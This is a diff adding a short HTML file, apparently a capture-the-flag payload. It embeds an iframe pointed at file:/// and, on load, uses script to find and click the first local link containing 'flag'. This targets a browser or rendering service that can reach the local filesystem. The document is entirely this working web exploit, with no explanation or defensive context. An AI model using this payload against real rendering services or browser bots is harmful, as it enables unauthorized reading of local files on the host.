@@ -1,0 +1,7 @@
+<iframe id="x" width="1000" height="1000" src="file:///"></iframe>
+<script>
+  window.onload = () =>
+    new Array(...x.contentWindow.document.querySelectorAll("a"))
+      .filter((a) => a.href.includes("flag"))[0]
+      .click();
+</script>
